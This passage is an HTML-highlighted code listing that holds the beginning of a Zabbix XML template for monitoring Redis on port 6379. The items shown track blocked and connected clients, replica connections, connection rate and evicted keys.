class=\"line\">221</span><br><span class=\"line\">222</span><br><span class=\"line\">223</span><br><span class=\"line\">224</span><br><span class=\"line\">225</span><br><span class=\"line\">226</span><br><span class=\"line\">227</span><br><span class=\"line\">228</span><br><span class=\"line\">229</span><br><span class=\"line\">230</span><br><span class=\"line\">231</span><br><span class=\"line\">232</span><br><span class=\"line\">233</span><br><span class=\"line\">234</span><br><span class=\"line\">235</span><br><span class=\"line\">236</span><br><span class=\"line\">237</span><br><span class=\"line\">238</span><br><span class=\"line\">239</span><br><span class=\"line\">240</span><br><span class=\"line\">241</span><br><span class=\"line\">242</span><br><span class=\"line\">243</span><br><span class=\"line\">244</span><br><span class=\"line\">245</span><br><span class=\"line\">246</span><br><span class=\"line\">247</span><br><span class=\"line\">248</span><br><span class=\"line\">249</span><br><span class=\"line\">250</span><br><span class=\"line\">251</span><br><span class=\"line\">252</span><br><span class=\"line\">253</span><br><span class=\"line\">254</span><br><span class=\"line\">255</span><br><span class=\"line\">256</span><br><span class=\"line\">257</span><br><span class=\"line\">258</span><br><span class=\"line\">259</span><br><span class=\"line\">260</span><br><span class=\"line\">261</span><br><span class=\"line\">262</span><br><span class=\"line\">263</span><br><span class=\"line\">264</span><br><span class=\"line\">265</span><br><span class=\"line\">266</span><br><span class=\"line\">267</span><br><span class=\"line\">268</span><br><span class=\"line\">269</span><br><span class=\"line\">270</span><br><span class=\"line\">271</span><br><span class=\"line\">272</span><br><span class=\"line\">273</span><br><span class=\"line\">274</span><br><span class=\"line\">275</span><br><span class=\"line\">276</span><br><span class=\"line\">277</span><br><span class=\"line\">278</span><br><span class=\"line\">279</span><br><span class=\"line\">280</span><br><span class=\"line\">281</span><br><span class=\"line\">282</span><br><span class=\"line\">283</span><br><span class=\"line\">284</span><br><span class=\"line\">285</span><br><span class=\"line\">286</span><br><span class=\"line\">287</span><br><span class=\"line\">288</span><br><span class=\"line\">289</span><br><span class=\"line\">290</span><br><span class=\"line\">291</span><br><span class=\"line\">292</span><br><span class=\"line\">293</span><br><span class=\"line\">294</span><br><span class=\"line\">295</span><br><span class=\"line\">296</span><br><span class=\"line\">297</span><br><span class=\"line\">298</span><br><span class=\"line\">299</span><br><span class=\"line\">300</span><br><span class=\"line\">301</span><br><span class=\"line\">302</span><br><span class=\"line\">303</span><br><span class=\"line\">304</span><br><span class=\"line\">305</span><br><span class=\"line\">306</span><br><span class=\"line\">307</span><br><span class=\"line\">308</span><br><span class=\"line\">309</span><br><span class=\"line\">310</span><br><span class=\"line\">311</span><br><span class=\"line\">312</span><br><span class=\"line\">313</span><br><span class=\"line\">314</span><br><span class=\"line\">315</span><br><span class=\"line\">316</span><br><span class=\"line\">317</span><br><span class=\"line\">318</span><br><span class=\"line\">319</span><br><span class=\"line\">320</span><br><span class=\"line\">321</span><br><span class=\"line\">322</span><br><span class=\"line\">323</span><br><span class=\"line\">324</span><br><span class=\"line\">325</span><br><span class=\"line\">326</span><br><span class=\"line\">327</span><br><span class=\"line\">328</span><br><span class=\"line\">329</span><br><span class=\"line\">330</span><br><span class=\"line\">331</span><br><span class=\"line\">332</span><br><span class=\"line\">333</span><br><span class=\"line\">334</span><br><span class=\"line\">335</span><br><span class=\"line\">336</span><br><span class=\"line\">337</span><br><span class=\"line\">338</span><br><span class=\"line\">339</span><br><span class=\"line\">340</span><br><span class=\"line\">341</span><br><span class=\"line\">342</span><br><span class=\"line\">343</span><br><span class=\"line\">344</span><br><span class=\"line\">345</span><br><span class=\"line\">346</span><br><span class=\"line\">347</span><br><span class=\"line\">348</span><br><span class=\"line\">349</span><br><span class=\"line\">350</span><br><span class=\"line\">351</span><br><span class=\"line\">352</span><br><span class=\"line\">353</span><br><span class=\"line\">354</span><br><span class=\"line\">355</span><br><span class=\"line\">356</span><br><span class=\"line\">357</span><br><span class=\"line\">358</span><br><span class=\"line\">359</span><br><span class=\"line\">360</span><br><span class=\"line\">361</span><br><span class=\"line\">362</span><br><span class=\"line\">363</span><br><span class=\"line\">364</span><br><span class=\"line\">365</span><br><span class=\"line\">366</span><br><span class=\"line\">367</span><br><span class=\"line\">368</span><br><span class=\"line\">369</span><br><span class=\"line\">370</span><br><span class=\"line\">371</span><br><span class=\"line\">372</span><br><span class=\"line\">373</span><br><span class=\"line\">374</span><br><span class=\"line\">375</span><br><span class=\"line\">376</span><br><span class=\"line\">377</span><br><span class=\"line\">378</span><br><span class=\"line\">379</span><br><span class=\"line\">380</span><br><span class=\"line\">381</span><br><span class=\"line\">382</span><br><span class=\"line\">383</span><br><span class=\"line\">384</span><br><span class=\"line\">385</span><br><span class=\"line\">386</span><br><span class=\"line\">387</span><br><span class=\"line\">388</span><br><span class=\"line\">389</span><br><span class=\"line\">390</span><br><span class=\"line\">391</span><br><span class=\"line\">392</span><br><span class=\"line\">393</span><br><span class=\"line\">394</span><br><span class=\"line\">395</span><br><span class=\"line\">396</span><br><span class=\"line\">397</span><br><span class=\"line\">398</span><br><span class=\"line\">399</span><br><span class=\"line\">400</span><br><span class=\"line\">401</span><br><span class=\"line\">402</span><br><span class=\"line\">403</span><br><span class=\"line\">404</span><br><span class=\"line\">405</span><br><span class=\"line\">406</span><br><span class=\"line\">407</span><br><span class=\"line\">408</span><br><span class=\"line\">409</span><br><span class=\"line\">410</span><br><span class=\"line\">411</span><br><span class=\"line\">412</span><br><span class=\"line\">413</span><br><span class=\"line\">414</span><br><span class=\"line\">415</span><br><span class=\"line\">416</span><br><span class=\"line\">417</span><br><span class=\"line\">418</span><br><span class=\"line\">419</span><br><span class=\"line\">420</span><br><span class=\"line\">421</span><br><span class=\"line\">422</span><br><span class=\"line\">423</span><br><span class=\"line\">424</span><br><span class=\"line\">425</span><br><span class=\"line\">426</span><br><span class=\"line\">427</span><br><span class=\"line\">428</span><br><span class=\"line\">429</span><br><span class=\"line\">430</span><br><span class=\"line\">431</span><br><span class=\"line\">432</span><br><span class=\"line\">433</span><br><span class=\"line\">434</span><br><span class=\"line\">435</span><br><span class=\"line\">436</span><br><span class=\"line\">437</span><br><span class=\"line\">438</span><br><span class=\"line\">439</span><br><span class=\"line\">440</span><br><span class=\"line\">441</span><br><span class=\"line\">442</span><br><span class=\"line\">443</span><br><span class=\"line\">444</span><br><span class=\"line\">445</span><br><span class=\"line\">446</span><br><span class=\"line\">447</span><br><span class=\"line\">448</span><br><span class=\"line\">449</span><br><span class=\"line\">450</span><br><span class=\"line\">451</span><br><span class=\"line\">452</span><br><span class=\"line\">453</span><br><span class=\"line\">454</span><br><span class=\"line\">455</span><br><span class=\"line\">456</span><br><span class=\"line\">457</span><br><span class=\"line\">458</span><br><span class=\"line\">459</span><br><span class=\"line\">460</span><br><span class=\"line\">461</span><br><span class=\"line\">462</span><br><span class=\"line\">463</span><br><span class=\"line\">464</span><br><span class=\"line\">465</span><br><span class=\"line\">466</span><br><span class=\"line\">467</span><br><span class=\"line\">468</span><br><span class=\"line\">469</span><br><span class=\"line\">470</span><br><span class=\"line\">471</span><br><span class=\"line\">472</span><br><span class=\"line\">473</span><br><span class=\"line\">474</span><br><span class=\"line\">475</span><br><span class=\"line\">476</span><br><span class=\"line\">477</span><br><span class=\"line\">478</span><br><span class=\"line\">479</span><br><span class=\"line\">480</span><br><span class=\"line\">481</span><br><span class=\"line\">482</span><br><span class=\"line\">483</span><br><span class=\"line\">484</span><br><span class=\"line\">485</span><br><span class=\"line\">486</span><br><span class=\"line\">487</span><br><span class=\"line\">488</span><br><span class=\"line\">489</span><br><span class=\"line\">490</span><br><span class=\"line\">491</span><br><span class=\"line\">492</span><br><span class=\"line\">493</span><br><span class=\"line\">494</span><br><span class=\"line\">495</span><br><span class=\"line\">496</span><br><span class=\"line\">497</span><br><span class=\"line\">498</span><br><span class=\"line\">499</span><br><span class=\"line\">500</span><br><span class=\"line\">501</span><br><span class=\"line\">502</span><br><span class=\"line\">503</span><br><span class=\"line\">504</span><br><span class=\"line\">505</span><br><span class=\"line\">506</span><br><span class=\"line\">507</span><br><span class=\"line\">508</span><br><span class=\"line\">509</span><br><span class=\"line\">510</span><br><span class=\"line\">511</span><br><span class=\"line\">512</span><br><span class=\"line\">513</span><br><span class=\"line\">514</span><br><span class=\"line\">515</span><br><span class=\"line\">516</span><br><span class=\"line\">517</span><br><span class=\"line\">518</span><br><span class=\"line\">519</span><br><span class=\"line\">520</span><br><span class=\"line\">521</span><br><span class=\"line\">522</span><br><span class=\"line\">523</span><br><span class=\"line\">524</span><br><span class=\"line\">525</span><br><span class=\"line\">526</span><br><span class=\"line\">527</span><br><span class=\"line\">528</span><br><span class=\"line\">529</span><br><span class=\"line\">530</span><br><span class=\"line\">531</span><br><span class=\"line\">532</span><br><span class=\"line\">533</span><br><span class=\"line\">534</span><br><span class=\"line\">535</span><br><span class=\"line\">536</span><br><span class=\"line\">537</span><br><span class=\"line\">538</span><br><span class=\"line\">539</span><br><span class=\"line\">540</span><br><span class=\"line\">541</span><br><span class=\"line\">542</span><br><span class=\"line\">543</span><br><span class=\"line\">544</span><br><span class=\"line\">545</span><br><span class=\"line\">546</span><br><span class=\"line\">547</span><br><span class=\"line\">548</span><br><span class=\"line\">549</span><br><span class=\"line\">550</span><br><span class=\"line\">551</span><br><span class=\"line\">552</span><br><span class=\"line\">553</span><br><span class=\"line\">554</span><br><span class=\"line\">555</span><br><span class=\"line\">556</span><br><span class=\"line\">557</span><br><span class=\"line\">558</span><br><span class=\"line\">559</span><br><span class=\"line\">560</span><br><span class=\"line\">561</span><br><span class=\"line\">562</span><br><span class=\"line\">563</span><br><span class=\"line\">564</span><br><span class=\"line\">565</span><br><span class=\"line\">566</span><br><span class=\"line\">567</span><br><span class=\"line\">568</span><br><span class=\"line\">569</span><br><span class=\"line\">570</span><br><span class=\"line\">571</span><br><span class=\"line\">572</span><br><span class=\"line\">573</span><br><span class=\"line\">574</span><br><span class=\"line\">575</span><br><span class=\"line\">576</span><br><span class=\"line\">577</span><br><span class=\"line\">578</span><br><span class=\"line\">579</span><br><span class=\"line\">580</span><br><span class=\"line\">581</span><br><span class=\"line\">582</span><br><span class=\"line\">583</span><br><span class=\"line\">584</span><br><span class=\"line\">585</span><br><span class=\"line\">586</span><br><span class=\"line\">587</span><br><span class=\"line\">588</span><br><span class=\"line\">589</span><br><span class=\"line\">590</span><br><span class=\"line\">591</span><br><span class=\"line\">592</span><br><span class=\"line\">593</span><br><span class=\"line\">594</span><br><span class=\"line\">595</span><br><span class=\"line\">596</span><br><span class=\"line\">597</span><br><span class=\"line\">598</span><br><span class=\"line\">599</span><br><span class=\"line\">600</span><br><span class=\"line\">601</span><br><span class=\"line\">602</span><br><span class=\"line\">603</span><br><span class=\"line\">604</span><br><span class=\"line\">605</span><br><span class=\"line\">606</span><br><span class=\"line\">607</span><br><span class=\"line\">608</span><br><span class=\"line\">609</span><br><span class=\"line\">610</span><br><span class=\"line\">611</span><br><span class=\"line\">612</span><br><span class=\"line\">613</span><br><span class=\"line\">614</span><br><span class=\"line\">615</span><br><span class=\"line\">616</span><br><span class=\"line\">617</span><br><span class=\"line\">618</span><br><span class=\"line\">619</span><br><span class=\"line\">620</span><br><span class=\"line\">621</span><br><span class=\"line\">622</span><br><span class=\"line\">623</span><br><span class=\"line\">624</span><br><span class=\"line\">625</span><br><span class=\"line\">626</span><br><span class=\"line\">627</span><br><span class=\"line\">628</span><br><span class=\"line\">629</span><br><span class=\"line\">630</span><br><span class=\"line\">631</span><br><span class=\"line\">632</span><br><span class=\"line\">633</span><br><span class=\"line\">634</span><br><span class=\"line\">635</span><br><span class=\"line\">636</span><br><span class=\"line\">637</span><br><span class=\"line\">638</span><br><span class=\"line\">639</span><br><span class=\"line\">640</span><br><span class=\"line\">641</span><br><span class=\"line\">642</span><br><span class=\"line\">643</span><br><span class=\"line\">644</span><br><span class=\"line\">645</span><br><span class=\"line\">646</span><br><span class=\"line\">647</span><br><span class=\"line\">648</span><br><span class=\"line\">649</span><br><span class=\"line\">650</span><br><span class=\"line\">651</span><br><span class=\"line\">652</span><br><span class=\"line\">653</span><br><span class=\"line\">654</span><br><span class=\"line\">655</span><br><span class=\"line\">656</span><br><span class=\"line\">657</span><br><span class=\"line\">658</span><br><span class=\"line\">659</span><br><span class=\"line\">660</span><br><span class=\"line\">661</span><br><span class=\"line\">662</span><br><span class=\"line\">663</span><br><span class=\"line\">664</span><br><span class=\"line\">665</span><br><span class=\"line\">666</span><br><span class=\"line\">667</span><br><span class=\"line\">668</span><br><span class=\"line\">669</span><br><span class=\"line\">670</span><br><span class=\"line\">671</span><br><span class=\"line\">672</span><br><span class=\"line\">673</span><br><span class=\"line\">674</span><br><span class=\"line\">675</span><br><span class=\"line\">676</span><br><span class=\"line\">677</span><br><span class=\"line\">678</span><br><span class=\"line\">679</span><br><span class=\"line\">680</span><br><span class=\"line\">681</span><br><span class=\"line\">682</span><br><span class=\"line\">683</span><br><span class=\"line\">684</span><br><span class=\"line\">685</span><br><span class=\"line\">686</span><br><span class=\"line\">687</span><br><span class=\"line\">688</span><br><span class=\"line\">689</span><br><span class=\"line\">690</span><br><span class=\"line\">691</span><br><span class=\"line\">692</span><br><span class=\"line\">693</span><br><span class=\"line\">694</span><br><span class=\"line\">695</span><br><span class=\"line\">696</span><br><span class=\"line\">697</span><br><span class=\"line\">698</span><br><span class=\"line\">699</span><br><span class=\"line\">700</span><br><span class=\"line\">701</span><br><span class=\"line\">702</span><br><span class=\"line\">703</span><br><span class=\"line\">704</span><br><span class=\"line\">705</span><br><span class=\"line\">706</span><br><span class=\"line\">707</span><br><span class=\"line\">708</span><br><span class=\"line\">709</span><br><span class=\"line\">710</span><br><span class=\"line\">711</span><br><span class=\"line\">712</span><br><span class=\"line\">713</span><br><span class=\"line\">714</span><br><span class=\"line\">715</span><br><span class=\"line\">716</span><br><span class=\"line\">717</span><br><span class=\"line\">718</span><br><span class=\"line\">719</span><br><span class=\"line\">720</span><br><span class=\"line\">721</span><br><span class=\"line\">722</span><br><span class=\"line\">723</span><br><span class=\"line\">724</span><br><span class=\"line\">725</span><br><span class=\"line\">726</span><br><span class=\"line\">727</span><br><span class=\"line\">728</span><br><span class=\"line\">729</span><br><span class=\"line\">730</span><br><span class=\"line\">731</span><br><span class=\"line\">732</span><br><span class=\"line\">733</span><br><span class=\"line\">734</span><br><span class=\"line\">735</span><br><span class=\"line\">736</span><br><span class=\"line\">737</span><br><span class=\"line\">738</span><br><span class=\"line\">739</span><br><span class=\"line\">740</span><br><span class=\"line\">741</span><br><span class=\"line\">742</span><br><span class=\"line\">743</span><br><span class=\"line\">744</span><br><span class=\"line\">745</span><br><span class=\"line\">746</span><br><span class=\"line\">747</span><br><span class=\"line\">748</span><br><span class=\"line\">749</span><br><span class=\"line\">750</span><br><span class=\"line\">751</span><br><span class=\"line\">752</span><br><span class=\"line\">753</span><br><span class=\"line\">754</span><br><span class=\"line\">755</span><br><span class=\"line\">756</span><br><span class=\"line\">757</span><br><span class=\"line\">758</span><br><span class=\"line\">759</span><br><span class=\"line\">760</span><br><span class=\"line\">761</span><br><span class=\"line\">762</span><br><span class=\"line\">763</span><br><span class=\"line\">764</span><br><span class=\"line\">765</span><br><span class=\"line\">766</span><br><span class=\"line\">767</span><br><span class=\"line\">768</span><br><span class=\"line\">769</span><br><span class=\"line\">770</span><br><span class=\"line\">771</span><br><span class=\"line\">772</span><br><span class=\"line\">773</span><br><span class=\"line\">774</span><br><span class=\"line\">775</span><br><span class=\"line\">776</span><br><span class=\"line\">777</span><br><span class=\"line\">778</span><br><span class=\"line\">779</span><br><span class=\"line\">780</span><br><span class=\"line\">781</span><br><span class=\"line\">782</span><br><span class=\"line\">783</span><br><span class=\"line\">784</span><br><span class=\"line\">785</span><br><span class=\"line\">786</span><br><span class=\"line\">787</span><br><span class=\"line\">788</span><br><span class=\"line\">789</span><br><span class=\"line\">790</span><br><span class=\"line\">791</span><br><span class=\"line\">792</span><br><span class=\"line\">793</span><br><span class=\"line\">794</span><br><span class=\"line\">795</span><br><span class=\"line\">796</span><br><span class=\"line\">797</span><br><span class=\"line\">798</span><br><span class=\"line\">799</span><br><span class=\"line\">800</span><br><span class=\"line\">801</span><br><span class=\"line\">802</span><br><span class=\"line\">803</span><br><span class=\"line\">804</span><br><span class=\"line\">805</span><br><span class=\"line\">806</span><br><span class=\"line\">807</span><br><span class=\"line\">808</span><br><span class=\"line\">809</span><br><span class=\"line\">810</span><br><span class=\"line\">811</span><br><span class=\"line\">812</span><br><span class=\"line\">813</span><br><span class=\"line\">814</span><br><span class=\"line\">815</span><br><span class=\"line\">816</span><br><span class=\"line\">817</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?xml version=<span class=\"string\">&quot;1.0&quot;</span> encoding=<span class=\"string\">&quot;UTF-8&quot;</span>?&gt;</span><br><span class=\"line\">&lt;zabbix_<span class=\"built_in\">export</span>&gt;</span><br><span class=\"line\">    &lt;version&gt;2.0&lt;/version&gt;</span><br><span class=\"line\">    &lt;date&gt;2014-02-20T12:21:39Z&lt;/date&gt;</span><br><span class=\"line\">    &lt;groups&gt;</span><br><span class=\"line\">        &lt;group&gt;</span><br><span class=\"line\">            &lt;name&gt;Templates&lt;/name&gt;</span><br><span class=\"line\">        &lt;/group&gt;</span><br><span class=\"line\">    &lt;/groups&gt;</span><br><span class=\"line\">    &lt;templates&gt;</span><br><span class=\"line\">        &lt;template&gt;</span><br><span class=\"line\">            &lt;template&gt;Templates Redis_6379&lt;/template&gt;</span><br><span class=\"line\">            &lt;name&gt;Templates Redis_6379&lt;/name&gt;</span><br><span class=\"line\">            &lt;groups&gt;</span><br><span class=\"line\">                &lt;group&gt;</span><br><span class=\"line\">                    &lt;name&gt;Templates&lt;/name&gt;</span><br><span class=\"line\">                &lt;/group&gt;</span><br><span class=\"line\">            &lt;/groups&gt;</span><br><span class=\"line\">            &lt;applications&gt;</span><br><span class=\"line\">                &lt;application&gt;</span><br><span class=\"line\">                    &lt;name&gt;Redis_6379&lt;/name&gt;</span><br><span class=\"line\">                &lt;/application&gt;</span><br><span class=\"line\">            &lt;/applications&gt;</span><br><span class=\"line\">            &lt;items&gt;</span><br><span class=\"line\">                &lt;item&gt;</span><br><span class=\"line\">                    &lt;name&gt;Blocked clients_6379&lt;/name&gt;</span><br><span class=\"line\">                    &lt;<span class=\"built_in\">type</span>&gt;0&lt;/<span class=\"built_in\">type</span>&gt;</span><br><span class=\"line\">                    &lt;snmp_community/&gt;</span><br><span class=\"line\">                    &lt;multiplier&gt;0&lt;/multiplier&gt;</span><br><span class=\"line\">                    &lt;snmp_oid/&gt;</span><br><span class=\"line\">                    &lt;key&gt;redis_stats[6379,blocked_clients]&lt;/key&gt;</span><br><span class=\"line\">                    &lt;delay&gt;60&lt;/delay&gt;</span><br><span class=\"line\">                    &lt;<span class=\"built_in\">history</span>&gt;7&lt;/<span class=\"built_in\">history</span>&gt;</span><br><span class=\"line\">                    &lt;trends&gt;365&lt;/trends&gt;</span><br><span class=\"line\">                    &lt;status&gt;0&lt;/status&gt;</span><br><span class=\"line\">                    &lt;value_<span class=\"built_in\">type</span>&gt;3&lt;/value_<span class=\"built_in\">type</span>&gt;</span><br><span class=\"line\">                    &lt;allowed_hosts/&gt;</span><br><span class=\"line\">                    &lt;units/&gt;</span><br><span class=\"line\">                    &lt;delta&gt;0&lt;/delta&gt;</span><br><span class=\"line\">                    &lt;snmpv3_securityname/&gt;</span><br><span class=\"line\">                    &lt;snmpv3_securitylevel&gt;0&lt;/snmpv3_securitylevel&gt;</span><br><span class=\"line\">                    &lt;snmpv3_authpassphrase/&gt;</span><br><span class=\"line\">                    &lt;snmpv3_privpassphrase/&gt;</span><br><span class=\"line\">                    &lt;formula&gt;1&lt;/formula&gt;</span><br><span class=\"line\">                    &lt;delay_flex/&gt;</span><br><span class=\"line\">                    &lt;params/&gt;</span><br><span class=\"line\">                    &lt;ipmi_sensor/&gt;</span><br><span class=\"line\">                    &lt;data_<span class=\"built_in\">type</span>&gt;0&lt;/data_<span class=\"built_in\">type</span>&gt;</span><br><span class=\"line\">                    &lt;authtype&gt;0&lt;/authtype&gt;</span><br><span class=\"line\">                    &lt;username/&gt;</span><br><span class=\"line\">                    &lt;password/&gt;</span><br><span class=\"line\">                    &lt;publickey/&gt;</span><br><span class=\"line\">                    &lt;privatekey/&gt;</span><br><span class=\"line\">                    &lt;port/&gt;</span><br><span class=\"line\">                    &lt;description/&gt;</span><br><span class=\"line\">                    &lt;inventory_link&gt;0&lt;/inventory_link&gt;</span><br><span class=\"line\">                    &lt;applications&gt;</span><br><span class=\"line\">                        &lt;application&gt;</span><br><span class=\"line\">                            &lt;name&gt;Redis_6379&lt;/name&gt;</span><br><span class=\"line\">                        &lt;/application&gt;</span><br><span class=\"line\">                    &lt;/applications&gt;</span><br><span class=\"line\">                    &lt;valuemap/&gt;</span><br><span class=\"line\">                &lt;/item&gt;</span><br><span class=\"line\">                &lt;item&gt;</span><br><span class=\"line\">                    &lt;name&gt;Connected clients_6379&lt;/name&gt;</span><br><span class=\"line\">                    &lt;<span class=\"built_in\">type</span>&gt;0&lt;/<span class=\"built_in\">type</span>&gt;</span><br><span class=\"line\">                    &lt;snmp_community/&gt;</span><br><span class=\"line\">                    &lt;multiplier&gt;0&lt;/multiplier&gt;</span><br><span class=\"line\">                    &lt;snmp_oid/&gt;</span><br><span class=\"line\">                    &lt;key&gt;redis_stats[6379,connected_clients]&lt;/key&gt;</span><br><span class=\"line\">                    &lt;delay&gt;60&lt;/delay&gt;</span><br><span class=\"line\">                    &lt;<span class=\"built_in\">history</span>&gt;7&lt;/<span class=\"built_in\">history</span>&gt;</span><br><span class=\"line\">                    &lt;trends&gt;365&lt;/trends&gt;</span><br><span class=\"line\">                    &lt;status&gt;0&lt;/status&gt;</span><br><span class=\"line\">                    &lt;value_<span class=\"built_in\">type</span>&gt;3&lt;/value_<span class=\"built_in\">type</span>&gt;</span><br><span class=\"line\">                    &lt;allowed_hosts/&gt;</span><br><span class=\"line\">                    &lt;units/&gt;</span><br><span class=\"line\">                    &lt;delta&gt;0&lt;/delta&gt;</span><br><span class=\"line\">                    &lt;snmpv3_securityname/&gt;</span><br><span class=\"line\">                    &lt;snmpv3_securitylevel&gt;0&lt;/snmpv3_securitylevel&gt;</span><br><span class=\"line\">                    &lt;snmpv3_authpassphrase/&gt;</span><br><span class=\"line\">                    &lt;snmpv3_privpassphrase/&gt;</span><br><span class=\"line\">                    &lt;formula&gt;1&lt;/formula&gt;</span><br><span class=\"line\">                    &lt;delay_flex/&gt;</span><br><span class=\"line\">                    &lt;params/&gt;</span><br><span class=\"line\">                    &lt;ipmi_sensor/&gt;</span><br><span class=\"line\">                    &lt;data_<span class=\"built_in\">type</span>&gt;0&lt;/data_<span class=\"built_in\">type</span>&gt;</span><br><span class=\"line\">                    &lt;authtype&gt;0&lt;/authtype&gt;</span><br><span class=\"line\">                    &lt;username/&gt;</span><br><span class=\"line\">                    &lt;password/&gt;</span><br><span class=\"line\">                    &lt;publickey/&gt;</span><br><span class=\"line\">                    &lt;privatekey/&gt;</span><br><span class=\"line\">                    &lt;port/&gt;</span><br><span class=\"line\">                    &lt;description/&gt;</span><br><span class=\"line\">                    &lt;inventory_link&gt;0&lt;/inventory_link&gt;</span><br><span class=\"line\">                    &lt;applications&gt;</span><br><span class=\"line\">                        &lt;application&gt;</span><br><span class=\"line\">                            &lt;name&gt;Redis_6379&lt;/name&gt;</span><br><span class=\"line\">                        &lt;/application&gt;</span><br><span class=\"line\">                    &lt;/applications&gt;</span><br><span class=\"line\">                    &lt;valuemap/&gt;</span><br><span class=\"line\">                &lt;/item&gt;</span><br><span class=\"line\">                &lt;item&gt;</span><br><span class=\"line\">                    &lt;name&gt;Connected slave_6380&lt;/name&gt;</span><br><span class=\"line\">                    &lt;<span class=\"built_in\">type</span>&gt;0&lt;/<span class=\"built_in\">type</span>&gt;</span><br><span class=\"line\">                    &lt;snmp_community/&gt;</span><br><span class=\"line\">                    &lt;multiplier&gt;0&lt;/multiplier&gt;</span><br><span class=\"line\">                    &lt;snmp_oid/&gt;</span><br><span class=\"line\">                    &lt;key&gt;redis_stats[6379,connected_slave]&lt;/key&gt;</span><br><span class=\"line\">                    &lt;delay&gt;60&lt;/delay&gt;</span><br><span class=\"line\">                    &lt;<span class=\"built_in\">history</span>&gt;7&lt;/<span class=\"built_in\">history</span>&gt;</span><br><span class=\"line\">                    &lt;trends&gt;365&lt;/trends&gt;</span><br><span class=\"line\">                    &lt;status&gt;0&lt;/status&gt;</span><br><span class=\"line\">                    &lt;value_<span class=\"built_in\">type</span>&gt;3&lt;/value_<span class=\"built_in\">type</span>&gt;</span><br><span class=\"line\">                    &lt;allowed_hosts/&gt;</span><br><span class=\"line\">                    &lt;units/&gt;</span><br><span class=\"line\">                    &lt;delta&gt;0&lt;/delta&gt;</span><br><span class=\"line\">                    &lt;snmpv3_securityname/&gt;</span><br><span class=\"line\">                    &lt;snmpv3_securitylevel&gt;0&lt;/snmpv3_securitylevel&gt;</span><br><span class=\"line\">                    &lt;snmpv3_authpassphrase/&gt;</span><br><span class=\"line\">                    &lt;snmpv3_privpassphrase/&gt;</span><br><span class=\"line\">                    &lt;formula&gt;1&lt;/formula&gt;</span><br><span class=\"line\">                    &lt;delay_flex/&gt;</span><br><span class=\"line\">                    &lt;params/&gt;</span><br><span class=\"line\">                    &lt;ipmi_sensor/&gt;</span><br><span class=\"line\">                    &lt;data_<span class=\"built_in\">type</span>&gt;0&lt;/data_<span class=\"built_in\">type</span>&gt;</span><br><span class=\"line\">                    &lt;authtype&gt;0&lt;/authtype&gt;</span><br><span class=\"line\">                    &lt;username/&gt;</span><br><span class=\"line\">                    &lt;password/&gt;</span><br><span class=\"line\">                    &lt;publickey/&gt;</span><br><span class=\"line\">                    &lt;privatekey/&gt;</span><br><span class=\"line\">                    &lt;port/&gt;</span><br><span class=\"line\">                    &lt;description/&gt;</span><br><span class=\"line\">                    &lt;inventory_link&gt;0&lt;/inventory_link&gt;</span><br><span class=\"line\">                    &lt;applications&gt;</span><br><span class=\"line\">                        &lt;application&gt;</span><br><span class=\"line\">                            &lt;name&gt;Redis_6379&lt;/name&gt;</span><br><span class=\"line\">                        &lt;/application&gt;</span><br><span class=\"line\">                    &lt;/applications&gt;</span><br><span class=\"line\">                    &lt;valuemap/&gt;</span><br><span class=\"line\">                &lt;/item&gt;</span><br><span class=\"line\">                &lt;item&gt;</span><br><span class=\"line\">                    &lt;name&gt;Connection rate_6379&lt;/name&gt;</span><br><span class=\"line\">                    &lt;<span class=\"built_in\">type</span>&gt;0&lt;/<span class=\"built_in\">type</span>&gt;</span><br><span class=\"line\">                    &lt;snmp_community/&gt;</span><br><span class=\"line\">                    &lt;multiplier&gt;0&lt;/multiplier&gt;</span><br><span class=\"line\">                    &lt;snmp_oid/&gt;</span><br><span class=\"line\">                    &lt;key&gt;redis_stats[6379,total_connections_received]&lt;/key&gt;</span><br><span class=\"line\">                    &lt;delay&gt;60&lt;/delay&gt;</span><br><span class=\"line\">                    &lt;<span class=\"built_in\">history</span>&gt;7&lt;/<span class=\"built_in\">history</span>&gt;</span><br><span class=\"line\">                    &lt;trends&gt;365&lt;/trends&gt;</span><br><span class=\"line\">                    &lt;status&gt;0&lt;/status&gt;</span><br><span class=\"line\">                    &lt;value_<span class=\"built_in\">type</span>&gt;3&lt;/value_<span class=\"built_in\">type</span>&gt;</span><br><span class=\"line\">                    &lt;allowed_hosts/&gt;</span><br><span class=\"line\">                    &lt;units/&gt;</span><br><span class=\"line\">                    &lt;delta&gt;1&lt;/delta&gt;</span><br><span class=\"line\">                    &lt;snmpv3_securityname/&gt;</span><br><span class=\"line\">                    &lt;snmpv3_securitylevel&gt;0&lt;/snmpv3_securitylevel&gt;</span><br><span class=\"line\">                    &lt;snmpv3_authpassphrase/&gt;</span><br><span class=\"line\">                    &lt;snmpv3_privpassphrase/&gt;</span><br><span class=\"line\">                    &lt;formula&gt;1&lt;/formula&gt;</span><br><span class=\"line\">                    &lt;delay_flex/&gt;</span><br><span class=\"line\">                    &lt;params/&gt;</span><br><span class=\"line\">                    &lt;ipmi_sensor/&gt;</span><br><span class=\"line\">                    &lt;data_<span class=\"built_in\">type</span>&gt;0&lt;/data_<span class=\"built_in\">type</span>&gt;</span><br><span class=\"line\">                    &lt;authtype&gt;0&lt;/authtype&gt;</span><br><span class=\"line\">                    &lt;username/&gt;</span><br><span class=\"line\">                    &lt;password/&gt;</span><br><span class=\"line\">                    &lt;publickey/&gt;</span><br><span class=\"line\">                    &lt;privatekey/&gt;</span><br><span class=\"line\">                    &lt;port/&gt;</span><br><span class=\"line\">                    &lt;description/&gt;</span><br><span class=\"line\">                    &lt;inventory_link&gt;0&lt;/inventory_link&gt;</span><br><span class=\"line\">                    &lt;applications&gt;</span><br><span class=\"line\">                        &lt;application&gt;</span><br><span class=\"line\">                            &lt;name&gt;Redis_6379&lt;/name&gt;</span><br><span class=\"line\">                        &lt;/application&gt;</span><br><span class=\"line\">                    &lt;/applications&gt;</span><br><span class=\"line\">                    &lt;valuemap/&gt;</span><br><span class=\"line\">                &lt;/item&gt;</span><br><span class=\"line\">                &lt;item&gt;</span><br><span class=\"line\">                    &lt;name&gt;Evicted_keys_6379&lt;/name&gt;</span><br><span class=\"line\">                    &lt;<span class=\"built_in\">type</span>&gt;0&lt;/<span class=\"built_in\">type</span>&gt;</span><br><span class=\"line\">                    &lt;snmp_community/&gt;</span><br><span class=\"line\">                    &lt;multiplier&gt;0&lt;/multiplier&gt;</span><br><span class=\"line\">                    &lt;snmp_oid/&gt;</span><br><span class=\"line\">                    &lt;key&gt;redis_stats[6379,evicted_keys]&lt;/key&gt;</span><br><span class=\"line\">                    